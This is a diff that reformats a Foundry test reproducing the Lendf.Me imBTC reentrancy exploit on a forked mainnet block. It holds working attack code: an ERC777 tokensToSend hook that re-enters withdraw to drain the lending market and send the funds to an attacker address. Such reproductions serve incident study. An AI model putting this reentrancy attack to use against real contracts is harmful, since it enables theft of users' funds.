@@ -13,12 +13,9 @@ Example tx - https://etherscan.io/tx/0xae7d664bdfcc54220df4f18d339005c6faf6e62c9
 */
 
 interface IMoneyMarket {
-    function supply(address asset, uint amount) external returns (uint);
+    function supply(address asset, uint256 amount) external returns (uint256);
 
-    function withdraw(
-        address asset,
-        uint requestedAmount
-    ) external returns (uint);
+    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);
 }
 
 contract LendfMeExploit is Test {
@@ -27,45 +24,34 @@ contract LendfMeExploit is Test {
     address victim = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea;
     address attacker = 0xA9BF70A420d364e923C74448D9D817d3F2A77822;
     IERC20 imBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
-    IERC1820Registry internal erc1820 =
-        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    IERC1820Registry internal erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
     bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH =
         0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 9899725);
+        cheats.createSelectFork("mainnet", 9_899_725);
     }
 
     function tokensToSend(
         address, // operator
         address, // from
         address, // to
-        uint amount,
+        uint256 amount,
         bytes calldata, // userData
         bytes calldata // operatorData
     ) external {
         if (amount == 1) {
-            IMoneyMarket(victim).withdraw(address(imBTC), type(uint).max);
+            IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);
         }
     }
 
     function testExploit() public {
-        emit log_named_uint(
-            "[Before Attack]Victim imBTC Balance : ",
-            (imBTC.balanceOf(victim))
-        );
-        emit log_named_uint(
-            "[Before Attack]Attacker imBTC Balance : ",
-            (imBTC.balanceOf(attacker))
-        );
+        emit log_named_uint("[Before Attack]Victim imBTC Balance : ", (imBTC.balanceOf(victim)));
+        emit log_named_uint("[Before Attack]Attacker imBTC Balance : ", (imBTC.balanceOf(attacker)));
 
         // prepare
         imBTC.approve(victim, type(uint256).max);
-        erc1820.setInterfaceImplementer(
-            address(this),
-            TOKENS_SENDER_INTERFACE_HASH,
-            address(this)
-        );
+        erc1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));
 
         // move
         cheats.startPrank(attacker);
@@ -73,31 +59,20 @@ contract LendfMeExploit is Test {
         cheats.stopPrank();
 
         // attack
-        uint this_balance = imBTC.balanceOf(address(this));
-        uint victim_balance = imBTC.balanceOf(victim);
+        uint256 this_balance = imBTC.balanceOf(address(this));
+        uint256 victim_balance = imBTC.balanceOf(victim);
         if (this_balance > (victim_balance + 1)) {
             this_balance = victim_balance + 1;
         }
         IMoneyMarket(victim).supply(address(imBTC), this_balance - 1);
         IMoneyMarket(victim).supply(address(imBTC), 1);
-        IMoneyMarket(victim).withdraw(address(imBTC), type(uint).max);
+        IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);
 
         // transfer benefit back to the attacker
-        IERC20(imBTC).transfer(
-            attacker,
-            IERC20(imBTC).balanceOf(address(this))
-        );
+        IERC20(imBTC).transfer(attacker, IERC20(imBTC).balanceOf(address(this)));
 
-        emit log_string(
-            "--------------------------------------------------------------"
-        );
-        emit log_named_uint(
-            "[After Attack]Victim imBTC Balance : ",
-            (imBTC.balanceOf(victim))
-        );
-        emit log_named_uint(
-            "[After Attack]Attacker imBTC Balance : ",
-            (imBTC.balanceOf(attacker))
-        );
+        emit log_string("--------------------------------------------------------------");
+        emit log_named_uint("[After Attack]Victim imBTC Balance : ", (imBTC.balanceOf(victim)));
+        emit log_named_uint("[After Attack]Attacker imBTC Balance : ", (imBTC.balanceOf(attacker)));
     }
 }
